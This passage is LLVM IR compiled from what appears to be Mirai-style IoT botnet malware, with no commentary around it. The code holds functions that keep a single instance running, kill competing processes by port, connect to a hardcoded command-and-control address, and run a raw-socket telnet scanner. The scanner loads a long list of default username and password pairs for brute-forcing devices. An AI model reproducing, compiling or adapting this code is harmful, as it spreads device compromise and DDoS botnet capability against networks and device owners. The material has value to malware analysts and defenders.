  %14 = call i32 @htonl(i32 2130706433) #11
  br label %17

; <label>:15:                                     ; preds = %5
  %16 = load i32, i32* @LOCAL_ADDR, align 4
  br label %17

; <label>:17:                                     ; preds = %15, %13
  %18 = phi i32 [ %14, %13 ], [ %16, %15 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %18, i32* %19, align 4
  %20 = call zeroext i16 @htons(i16 zeroext -14435) #11
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = tail call i32* @__errno_location() #11
  store i32 0, i32* %22, align 4
  %23 = load i32, i32* @fd_ctrl, align 4
  %24 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* nonnull %24, i32 16) #9
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %39

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %22, align 4
  %29 = icmp eq i32 %28, 99
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %27
  %.b = load i1, i1* @ensure_single_instance.local_bind, align 1
  br i1 %.b, label %32, label %31

; <label>:31:                                     ; preds = %30
  store i1 true, i1* @ensure_single_instance.local_bind, align 1
  br label %32

; <label>:32:                                     ; preds = %30, %31, %27
  store i16 2, i16* %12, align 4
  store i32 0, i32* %19, align 4
  store i16 %20, i16* %21, align 2
  %33 = load i32, i32* @fd_ctrl, align 4
  %34 = call i32 @connect(i32 %33, %struct.sockaddr* nonnull %24, i32 16) #9
  %35 = call i32 @sleep(i32 5) #9
  %36 = load i32, i32* @fd_ctrl, align 4
  %37 = call i32 @close(i32 %36) #9
  %38 = call signext i8 @killer_kill_by_port(i16 zeroext %20) #9
  call fastcc void @ensure_single_instance()
  br label %42

; <label>:39:                                     ; preds = %17
  %40 = load i32, i32* @fd_ctrl, align 4
  %41 = call i32 @listen(i32 %40, i32 1) #9
  br label %42

; <label>:42:                                     ; preds = %0, %39, %32
  ret void
}

declare void @rand_init() local_unnamed_addr #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

declare i32 @util_strlen(i8*) local_unnamed_addr #2

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #2

declare signext i8 @attack_init() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @establish_connection() unnamed_addr #3 {
  %1 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %1, i32* @fd_serv, align 4
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %12, label %3

; <label>:3:                                      ; preds = %0
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i64 0, i32 0), align 4
  %4 = tail call i32 @htonl(i32 -1335130672) #11
  store i32 %4, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i64 0, i32 2, i32 0), align 4
  %5 = tail call zeroext i16 @htons(i16 zeroext 1024) #11
  store i16 %5, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i64 0, i32 1), align 2
  %6 = load i32, i32* @fd_serv, align 4
  %7 = tail call i32 (i32, i32, ...) @fcntl(i32 %6, i32 3, i32 0) #9
  %8 = or i32 %7, 2048
  %9 = tail call i32 (i32, i32, ...) @fcntl(i32 %6, i32 4, i32 %8) #9
  store i8 1, i8* @pending_connection, align 1
  %10 = load i32, i32* @fd_serv, align 4
  %11 = tail call i32 @connect(i32 %10, %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), i32 16) #9
  br label %12

; <label>:12:                                     ; preds = %0, %3
  ret void
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #2

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #2

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

declare void @attack_kill_all() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @teardown_connection() unnamed_addr #3 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @close(i32 %1) #9
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 -1, i32* @fd_serv, align 4
  %6 = tail call i32 @sleep(i32 1) #9
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i32 @rand_next() local_unnamed_addr #2

declare i32 @sleep(i32) local_unnamed_addr #2

declare i32 @util_local_addr() local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #6

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #6

declare void @attack_parse(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #6

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #6

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

declare signext i8 @killer_kill_by_port(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() local_unnamed_addr #3 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca %struct.timeval, align 8
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [1514 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @fork() #9
  store i32 %9, i32* @scanner_pid, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = icmp eq i32 %9, -1
  %or.cond = or i1 %10, %11
  br i1 %or.cond, label %12, label %13

; <label>:12:                                     ; preds = %0
  ret void

; <label>:13:                                     ; preds = %0
  %14 = tail call i32 @util_local_addr() #9
  store i32 %14, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init() #9
  %15 = tail call i64 @time(i64* null) #9
  %16 = trunc i64 %15 to i32
  store i32 %16, i32* @fake_time, align 4
  %17 = tail call noalias i8* @calloc(i64 628, i64 8264) #9
  %18 = bitcast i8* %17 to %struct.scanner_connection*
  store i32 0, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %19, %13
  %indvars.iv307 = phi i64 [ 0, %13 ], [ %indvars.iv.next308.3, %19 ]
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv307, i32 2
  store i32 -1, i32* %20, align 8
  %indvars.iv.next308 = or i64 %indvars.iv307, 1
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv.next308, i32 2
  store i32 -1, i32* %21, align 8
  %indvars.iv.next308.1 = or i64 %indvars.iv307, 2
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv.next308.1, i32 2
  store i32 -1, i32* %22, align 8
  %indvars.iv.next308.2 = or i64 %indvars.iv307, 3
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv.next308.2, i32 2
  store i32 -1, i32* %23, align 8
  %indvars.iv.next308.3 = add nsw i64 %indvars.iv307, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next308.3, 628
  br i1 %exitcond.3, label %24, label %19

; <label>:24:                                     ; preds = %19
  store i32 628, i32* %1, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  store i32 %25, i32* @rsck, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %24
  tail call void @exit(i32 0) #10
  unreachable

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 (i32, i32, ...) @fcntl(i32 %25, i32 3, i32 0) #9
  %30 = or i32 %29, 2048
  %31 = tail call i32 (i32, i32, ...) @fcntl(i32 %25, i32 4, i32 %30) #9
  store i32 1, i32* %1, align 4
  %32 = load i32, i32* @rsck, align 4
  %33 = bitcast i32* %1 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 0, i32 3, i8* nonnull %33, i32 4) #9
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %.preheader270.preheader, label %36

.preheader270.preheader:                          ; preds = %28
  br label %.preheader270

; <label>:36:                                     ; preds = %28
  %37 = load i32, i32* @rsck, align 4
  %38 = call i32 @close(i32 %37) #9
  call void @exit(i32 0) #10
  unreachable

.preheader270:                                    ; preds = %.preheader270.preheader, %.preheader270
  %39 = call i32 @rand_next() #9
  %40 = trunc i32 %39 to i16
  %41 = call zeroext i16 @ntohs(i16 zeroext %40) #11
  %42 = icmp ult i16 %41, 1024
  br i1 %42, label %.preheader270, label %43

; <label>:43:                                     ; preds = %.preheader270
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), align 16
  %44 = call zeroext i16 @htons(i16 zeroext 40) #11
  store i16 %44, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  %45 = call i32 @rand_next() #9
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 9), align 1
  %47 = call zeroext i16 @htons(i16 zeroext 23) #11
  store i16 %47, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %40, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %48 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %49 = and i16 %48, -241
  %50 = or i16 %49, 80
  store i16 %50, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %51 = call i32 @rand_next() #9
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %53 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %54 = or i16 %53, 512
  store i16 %54, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.34, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.41, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.42, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i64 0, i64 0), i16 zeroext 16)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i64 0, i64 0), i16 zeroext 16)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i64 0, i64 0), i16 zeroext 17)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.65, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.78, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i16 zeroext 5)
